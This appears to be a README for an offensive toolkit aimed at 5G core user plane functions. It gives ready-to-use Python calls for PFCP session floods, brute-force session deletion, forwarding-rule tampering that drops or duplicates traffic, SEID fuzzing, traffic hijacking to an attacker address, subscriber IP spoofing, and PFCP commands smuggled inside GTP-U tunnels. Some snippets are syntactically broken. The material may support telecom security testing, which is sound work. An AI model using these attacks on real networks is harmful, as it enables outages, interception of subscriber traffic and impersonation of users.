# PFCP Attacks

## DoS PFCP Attacks

### PFCP Session Establishment Flood
Floods the target UPF with massive PFCP session establishment requests to exhaust resources and cause denial of service.

```python
from src.pfcpToolkit.pfcpDosAttack import PFCPDosAttack

# Initialize DoS attack
dos_attack = PFCPDosAttack()

# Basic flood attack
dos_attack.start_pfcp_session_establishment_flood(
    evil_addr="192.168.1.100",
    upf_addr="192.168.1.200",
    src_port=8805,
    dest_port=8805,
    num_threads=2,
    infinite=False
    randomize=True,
    random_far_number=15
)

# Infinite flood attack
dos_attack.start_pfcp_session_establishment_flood(
    evil_addr="192.168.1.100",
    upf_addr="192.168.1.200",
    reqNbr=1000,
    num_threads=5,
    infinite=True
)
```

---

### PFCP Session Deletion Brute Force
Enumerates SEIDs to delete active PFCP sessions.

```python
from src.pfcpToolkit.pfcpDosAttack import PFCPDosAttack

dos_attack = PFCPDosAttack()

# Brute force session deletion
dos_attack.start_pfcp_session_deletion_bruteforce(
    evil_addr="192.168.1.100",
    upf_addr="192.168.1.200",
    reqNbr=1000,
    num_threads=5

)
```

---

### PFCP Session Deletion Targeted
Deletes a specific PFCP session by SEID.

```python
from src.pfcpToolkit.pfcpDosAttack import PFCPDosAttack

dos_attack = PFCPDosAttack()

# Target specific session
dos_attack.start_pfcp_session_deletion_targeted(
    target_seid=0x1,
    evil_addr="192.168.1.100",
    upf_addr="192.168.1.200"
)
```

---

### PFCP Session Modification FAR Drop Brute Force
Modifies forwarding rules to drop traffic by brute forcing SEID/FAR combinations.

```python
from src.pfcpToolkit.pfcpDosAttack import PFCPDosAttack

dos_attack = PFCPDosAttack()

# Brute force FAR modifications to drop traffic
dos_attack.start_pfcp_session_modification_far_drop_bruteforce(
    far_range=100,
    session_range=100,
    evil_addr="192.168.1.100",
    upf_addr="192.168.1.200"
)
```

---

### PFCP Session Modification FAR Duplication Brute Force
Forces packet duplication to amplify network traffic and consume resources.

```python
from src.pfcpToolkit.pfcpDosAttack import PFCPDosAttack

dos_attack = PFCPDosAttack()

# Brute force FAR modifications for packet duplication
dos_attack.start_pfcp_session_modification_far_dupl_bruteforce(
    far_range=50,
    session_range=50,
    evil_addr="192.168.1.100",
    upf_addr="192.168.1.200"
)
```


## PFCP Fuzzer
### SEID Fuzzing
Fuzzes SEID values to discover active sessions.

```python
from src.attacks.pfcp.pfcpFuzzer import PFCPFuzzer

fuzzer = PFCPFuzzer()
fuzzer.start_PFCP_SEID_fuzzing(
   upf_addr="192.168.1.200",
   src_addr="192.168.1.100",
   max_seid=100,
   max_far_discover=1,
   src_port=8805,
   dest_port=8805,
)
```

### SEID-FAR-ID Fuzzing 
Fuzzes FAR-ID values to discover forwarding rules.

```python
from src.attacks.pfcp.pfcpFuzzer import PFCPFuzzer

fuzzer = PFCPFuzzer()
fuzzer.start_PFCP_FARID_fuzzing(
   upf_addr="192.168.1.200",
   src_addr="192.168.1.100",
   max_seid=10,
   max_far_discover=100,
   src_port=8805,
   dest_port=8805,
)
```

## PFCP Hijacking
### Hijacking by FAR manipulation
Uses PFCP Modification requests to redirect traffic to the attacker (exploitation of OuterHeaderCreation IE)
```python
from src.attacks.pfcp.pfcpHijack import PFCPHijack

hijack = PFCPHijack()
hijack.start_PFCP_hijack_far_manipulation(
   hijacker_addr="192.168.1.100",
   upf_addr="192.168.1.200",
   seid=0x1,
   src_port=8805,
   dest_port=8805,
   verbose=True,
)
```

# GTP-U Attacks 
## Packet Reflection Vulnerability Up Link Attack
Leverages GTP-U packet reflection vulnerabilities to spoof subscriber IP addresses, allowing attackers to impersonate UEs and conduct malicious activities that appear to originate from legitimate users.


```python
from src.attacks.gtp_u.uplinkSpoofing import start_gtp_uplink_attack 

start_gtp_uplink_attack()
```
## PFCP-In-GTP-U Attack
Encapsulates PFCP control plane commands inside GTP-U data tunnels to bypass security boundaries, enabling attackers to send unauthorized PFCP commands directly to the UPF.

```python
from src.attacks.gtp_u.pfcpInGtpAttack import send_malicious_pfcp_in_gtp_packet(
   src_addr="192.168.1.100"
   dest_addr="192.168.1.200",
   ue_addr="10.60.0.1",
   teid=0x1

)
```

